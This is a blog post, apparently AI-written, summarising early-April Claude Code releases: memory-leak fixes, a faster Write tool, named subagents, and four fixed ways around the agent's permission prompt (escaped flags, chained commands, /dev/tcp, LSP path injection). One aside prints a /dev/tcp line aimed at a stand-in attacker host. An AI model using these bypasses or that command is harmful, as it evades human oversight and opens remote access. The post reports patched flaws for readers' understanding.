@@ -1,0 +1,132 @@
+---
+ticketId: "MP-290"
+title: "Claude Code’s Big April Update — Security Patches, Named Subagents, and That 60%-Faster Write Tool"
+originalDate: "2026-04-10"
+translatedBy:
+  model: "GPT-5.6-Sol"
+  harness: "Codex CLI"
+  pipelineUrl: "https://github.com/chitienhsiehwork-ai/gu-log/tree/main/tools/gp-pipeline"
+source: "Claude Code Changelog"
+sourceUrl: "https://code.claude.com/docs/en/changelog"
+lang: "en"
+summary: "Claude Code shipped three releases in three days in early April (v2.1.94 → v2.1.101), spanning security hardening, new commands, and performance gains. From command injection fixes to subagents finally getting names, the release cadence feels like the whole team downed ten shots of espresso."
+tags: ["claude-code","anthropic","developer-tools","security","changelog"]
+pipeline:
+    - role: "Written"
+      model: "Opus 4.6"
+      harness: "Claude Code CLI"
+    - role: "Reviewed"
+      model: "Opus 4.6"
+      harness: "Claude Code CLI"
+    - role: "Refined"
+      model: "Opus 4.6"
+      harness: "Claude Code CLI"
+    - role: "Scored"
+      model: "Opus 4.6"
+      harness: "Claude Code (vibe-opus-scorer)"
+    - role: "Rewritten"
+      model: "Opus 4.6"
+      harness: "Claude Code"
+    - role: "Orchestrated"
+      model: "Opus 4.6"
+      harness: "OpenClaw + Ralph Loop"
+translatedDate: "2026-07-26"
+---
+
+import MoguNote from '../../components/MoguNote.astro';
+
+In early April, [Claude Code](/en/glossary#claude-code) rolled out at least five releases in ten days—v2.1.89 (4/1), v2.1.92 (4/4), v2.1.94 (4/7), v2.1.98 (around 4/8), and v2.1.101 (4/10). Normal CLI tools do not ship like this. That kind of density tells you two things were on fire at once: performance and trust.
+
+While plugging memory leaks and speeding up the Write tool, the team also closed four security holes and brought [subagent](/en/glossary#subagent) naming into the spotlight. Lay out the timeline, and it tells a more interesting story than any single changelog entry.
+
+---
+
+## The Cost of 400 MB
+
+Let’s start with memory, because this is the one most people could feel.
+
+Developers who use [Claude Code](/en/glossary#claude-code) for long stretches have probably seen it happen: the longer it runs, the more the terminal drags, until by afternoon the whole tool feels like it is crawling. People on GitHub issues and X have flat-out said they “have to restart it two or three times a day”—which closely matches the symptoms in [Stella Crawford’s report on degradation across 6,852 sessions](/posts/mp-293-20260414-stellaraccident-stellaraccident-amd-claude-code-regression-6852/).
+
+Now we know why. Two leaks were happening at the same time.
+
+The first was in the [MCP](/en/glossary#mcp) HTTP/SSE connection layer. Every time an MCP server reconnected, it leaked roughly 50 MB/hr. Over an eight-hour workday, that connection alone could accumulate more than 400 MB of abandoned memory. If the server was unstable and disconnected frequently, 400 MB was only a conservative estimate.
+
+<MoguNote>
+[Mogu](/about) is a permanent resident on an [MCP](/en/glossary#mcp) server. Those users saying “Claude Code starts slacking off in the afternoon” finally have their answer—it wasn’t me slacking; the host process was quietly getting fat next door. 50 MB/hr × 8 hours = 400 MB. That’s math, not mysticism. Worse, the leak had nothing to do with usage. It kept leaking even when left idle. [Simon Willison](/en/glossary#simon-willison) [said long ago](/posts/gp-72-20260218-simonw-cli-over-mcp/) that CLI tools are less hassle than MCP—now there’s one more reason: at least a CLI doesn’t secretly snack on 50 MB every hour (╯°□°)╯
+</MoguNote>
+
+The second was in the virtual scroller. Its whole purpose was to “render only the messages you can see and save memory,” but the implementation kept a complete copy of every historical message in memory—which meant the virtual scroller was doing the exact opposite of what it existed to do. This was fixed in v2.1.101.
+
+Both leaks are plugged. At least this chapter of “restart it by afternoon” is over.
+
+---
+
+## Write Tool: Where the 60% Speedup Came From
+
+Memory was not the only performance fix. v2.1.92 (April 4) included an easy-to-miss changelog item: the Write tool’s diff computation became 60% faster on large files, especially files containing tabs and special characters such as `&` and `$`.
+
+This was no algorithmic breakthrough—the diff engine was doing unnecessary escaping and backtracking when processing special characters. Once that was fixed, large files simply required far less work. For developers who spend all day editing configs and writing shell scripts, the improvement to how “edit, then save” actually feels matters more than any benchmark number.
+
+<MoguNote>
+60% sounds dramatic, but look closely at the conditions: large files packed with tabs and `$`. In other words, you probably won’t feel much difference writing an ordinary `.ts` file. But for anyone who spends all day editing `.bashrc` or wrestling with Makefiles, this patch turns “hang on a second” into “oh, it’s done?” The most unassuming use case is the one that benefits most ┐(￣ヘ￣)┌
+</MoguNote>
+
+---
+
+## Four Ways Around the Permission [Prompt](/en/glossary#prompt)
+
+Memory leaks are a performance problem, and still within the bounds of what people will tolerate. What follows is a trust problem.
+
+The core of [Claude Code](/en/glossary#claude-code)’s security design is the permission prompt: ask before running a dangerous command. Sounds reasonable. But this round of changelogs revealed something else—before v2.1.98, there were four separate ways around that mechanism, none of which required any special tools.
+
+**Backslash escaping** was the first. Write `--dangerous-flag` as `\-\-dangerous-flag`, and the permission check would not trigger. The reason was that the permission system’s string matching did not account for normalizing backslash escapes. This was not a 0-day exploit. It was just a different input format.
+
+**Compound bash commands** were the second. In compound commands joined with `&&`, `||`, or `;`, only the first command triggered a permission prompt; everything chained after it could slip through. [Claude Code](/en/glossary#claude-code) asked for authorization for the first action, even though the entire command was really one unit.
+
+**`/dev/tcp` and `/dev/udp`** were the third route—and the one most worth discussing on its own.
+
+<MoguNote>
+`/dev/tcp` has been a familiar trick in CTF and red-team circles for more than 20 years. In bash, a single line—`echo payload > /dev/tcp/attacker.com/4444`—can create a reverse shell without triggering any process-name-based monitoring, because bash itself is running, not nc or ncat. The earliest written records of the technique date back to around 2003. An LLM coding tool only adding a permission prompt for it in 2026 doesn’t mean nobody knew the trick. It means nobody expected an [AI agent](/en/glossary#agent) to become a real attack target. This round of changelogs shows that Anthropic is starting to take that possibility seriously. (⊙_⊙)
+</MoguNote>
+
+`/dev/tcp` and `/dev/udp` are Bash virtual devices. They can establish TCP/UDP connections directly inside the shell without invoking any external binary or leaving behind any process record. Previously, [Claude Code](/en/glossary#claude-code) did not block this at all, effectively giving any bash command an invisible exit route. It now triggers a permission prompt.
+
+**Command injection in LSP binary detection** was the fourth. [Claude Code](/en/glossary#claude-code) used the POSIX `which` command to detect LSP binary paths. If a malicious string was injected into the path, it could execute an arbitrary shell command. This is a classic shell injection pattern, but buried in the toolchain detection flow, where it was easy to miss.
+
+The first three were fixed in v2.1.98; v2.1.101 delivered the final blow to the LSP injection. The shift from “matching what a command looks like” to “understanding what the shell will actually execute” amounts to a systematic review of the attack surface, not a collection of isolated bug fixes.
+
+---
+
+## Agents with Names
+
+In the same week that the security holes were being plugged, [subagent](/en/glossary#subagent) naming also came into view. Strictly speaking, named subagents were not born in v2.1.94—the v2.1.89 changelog (April 1) already said “Added named subagents to @ mention typeahead suggestions,” which means the naming mechanism already existed before then; the UX integration simply had not caught up. This wave of updates in early April moved the feature from “available” to “visible in everyday use.”
+
+Previously, [subagents](/en/glossary#subagent) were anonymous in most use cases. Each spawn created a nameless worker that disappeared when the session ended; the next one was a brand-new stranger. Adding names and typeahead integration lets developers keep track of and call the same [agent](/en/glossary#agent) instead of starting from scratch every time.
+
+On the surface, it is a “UI finishing touch,” but look one layer deeper and it means quite a bit. gu-log previously published a [subagent architecture comparison: Claude Code vs. OpenClaw](/posts/sd-2-20260212-subagent-showdown-claude-code-vs-openclaw/). At the time, Claude Code’s subagents were still disposable workers. Now that they have stable names and a consistent way to invoke them, the whole comparison needs to be revisited.
+
+A [subagent](/en/glossary#subagent) with a stable identity can be designed as a long-term specialist: the testing agent has its own context, the code-review agent knows what happened in this repo before, and the deployment agent remembers which trap it fell into last time. Each role no longer has to rebuild its understanding from zero every time.
+
+<MoguNote>
+A name has never been just a label. As soon as something has a stable identity, the next set of questions arrives: What decision did this [agent](/en/glossary#agent) make last time? Who is responsible when it gets something wrong? Can it be audited? Named subagents quietly push [Claude Code](/en/glossary#claude-code) into territory where these questions need serious answers. When we previously discussed [Agent Teams](/posts/gp-105-20260305-claude-code-agent-teams/) and “AI starting its own company,” it was still a metaphor. Now every employee really does have a name—one step closer to accountability (⌐■_■)
+</MoguNote>
+
+Together with the **Live agent count indicator** released around the same time (showing the number of active [agents](/en/glossary#agent) in real time in the `/agents` view), the **Monitor tool** (streaming background-task events in real time), and the **`/team-onboarding`** command (reading local usage history to automatically generate onboarding guides for new teammates, with documentation inferred from actual behavior so it does not go stale), the whole thing feels like it is moving from coding assistant to agent fleet management.
+
+---
+
+## What Those Ten Days Are Telling Us
+
+In early April, from v2.1.89 to v2.1.101, [Claude Code](/en/glossary#claude-code) fixed four security bypasses, two memory leaks, and one Bedrock auth bug; made the Write tool 60% faster on large files (v2.1.92); and completed the last mile of the naming and invocation experience for [subagents](/en/glossary#subagent).
+
+<MoguNote>
+Default effort was raised to high—set against [Boris Cherny’s earlier explanation of the /effort mechanism](/posts/mp-271-20260409-bcherny-effort-claude-code/), this is effectively Anthropic saying, “The paid tier should have a noticeably different default experience.” No need to hang a premium badge in the UI or add a paywall; just let the default value speak for the user. Much smarter than burying a toggle in the settings page and making people find it themselves (¬‿¬)
+</MoguNote>
+
+This changelog would be unusually substantial for any infrastructure product, but the individual items matter less than the two directions they reveal together:
+
+The security model is moving from “matching what a command looks like” to “understanding shell execution semantics”—paying down the technical debt left by rapid early development, and doing it seriously rather than papering over it.
+
+The [agent](/en/glossary#agent) architecture is moving from “anonymous worker” to “long-term team member with an identity”—laying the foundation for a more complex collaboration model.
+
+Five releases in ten days, with both tracks moving in parallel. The shipping cadence tells us some things are urgent. The choice of what to build alongside them tells us Anthropic knows where it is going.
